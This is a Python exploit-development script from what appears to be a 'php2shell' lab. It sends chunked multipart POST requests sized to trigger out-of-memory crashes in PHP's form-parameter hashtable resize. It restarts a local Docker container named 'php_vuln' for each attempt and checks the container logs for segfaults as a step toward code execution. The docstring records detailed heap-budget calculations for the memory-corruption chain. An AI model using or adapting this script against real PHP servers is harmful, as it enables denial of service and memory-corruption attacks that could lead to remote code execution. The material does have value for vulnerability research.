#!/usr/bin/env python3
"""php2shell lab, oom22: resize-then-key kill.

Derived from oom19-21 (all measured):
  - key run self-finances: freed param CONTAINS name+value -> covers next
    part's key+value at every V/every name length. No V sweep can break it.
  - only unfunded liability: arData resize at 1024 elements
    (malloc 64KB, free 32KB old -> net deficit 32KB)
Kill window: resize lands when free F satisfies
    F > 32768 (resize succeeds; free' = F - 32768)
    free' >= 602 (param 530 + value 72 of the NEXT part still fit)
    free' < 602 + keylen (key zend_string 328..476B dies POST-COMMIT)
  -> F in (33370, 33750] approx; width ~400B; boot jitter ~KB
  -> grind: 32 boots x rem ladder step 512B; P(hit) ~5%/boot
Fill: ~950 elements pre-wall (9 + fill units), keys cross 1024 at key ~#70.
Gate: fatal alloc in [328..600] = key death post-commit -> segv check;
      alloc 65536/131072 = resize died pre-commit (clean) -> log only.
"""
import re
import socket
import subprocess
import sys
import time

sys.path.insert(0, "/tmp/phplab")
from oom14 import part, POISON, UNIT, alloc_n  # noqa: E402

KEYRUN = 600
V = 64

def restart():
    subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
    time.sleep(2.0)

def build(rem: int) -> list:
    ps = []
    for i in range(1, 10):
        ps.append(part(b"n%d" % i, b"A" * UNIT))
    fill = POISON * UNIT
    total = 475 * UNIT + rem - 9 * UNIT
    u = 0
    while total >= UNIT:
        ps.append(part(b"f%d" % u, fill)); total -= UNIT; u += 1
    if total > 0:
        ps.append(part(b"fx", POISON * total))
    for k in range(KEYRUN):
        nm = POISON * (280 + (k % 40)) + b"%d" % k
        ps.append(part(nm, POISON * V))
    return ps

def send(port: int, parts: list, path="index.php"):
    try:
        s = socket.create_connection(("127.0.0.1", port), timeout=120)
        body = b"".join(parts) + b"--BOUND--\r\n"
        hdr = (b"POST /" + path.encode() + b" HTTP/1.1\r\nHost: localhost\r\n"
               b"Transfer-Encoding: chunked\r\nContent-Type: "
               b"multipart/form-data; boundary=BOUND\r\nConnection: close\r\n\r\n")
        s.sendall(hdr)
        for i in range(0, len(body), 4096):
            c = body[i:i+4096]
            s.sendall(b"%x\r\n" % len(c) + c + b"\r\n")
        s.sendall(b"0\r\n\r\n")
        r = b""
        while True:
            d = s.recv(65536)
            if not d:
                break
            r += d
            if len(r) > 200000:
                break
        s.close()
    except (ConnectionResetError, socket.timeout, BrokenPipeError):
        return False, b""
    fatal = b"Fatal error" in r or b"Allowed memory" in r
    return fatal, r

def segcheck():
    r = subprocess.run(["docker", "logs", "php_vuln", "--tail", "150"],
                       capture_output=True, text=True)
    return [l for l in (r.stdout + r.stderr).splitlines()
            if "Segmentation" in l or "SIGSEGV" in l or "exited on signal" in l]

def main():
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8081

    def log(*a, **k):
        k.pop("flush", None)
        print(*a, flush=True)

    # preflight: dbg at ladder center — confirm resize mid-run (top>1024)
    restart()
    fatal, text = send(port, build(33500), path="dbg.php")
    m = re.search(rb"top=(\d+) a=(\d+) keybytes=(\d+) peak=(\d+)", text)
    log(f"preflight dbg: fatal={fatal} " + (str(m.groups()) if m else "no dbg line"))

    nf = 0
    for rem in range(30000, 46500, 512):
        restart()
        fatal, text = send(port, build(rem))
        a = alloc_n(text) if fatal else None
        if fatal:
            nf += 1
            if a is not None and 320 <= a <= 600:
                log(f"rem={rem}: fatal={fatal} alloc={a}  *** KEY DEATH — SEGFAULT CHECK ***")
                time.sleep(1.5)
                hits = segcheck()
                for h in hits:
                    log("SEGV: " + h)
                if hits:
                    log("*** SEGFAULT REPRODUCED — chain complete ***")
                    return
            elif a is not None and a >= 32768:
                log(f"rem={rem}: fatal={fatal} alloc={a} (resize death, pre-commit)")
            else:
                log(f"rem={rem}: fatal={fatal} alloc={a}")
        else:
            log(f"rem={rem}: survive")
    log(f"== oom22 done: {nf} fatals ==")

if __name__ == "__main__":
    main()
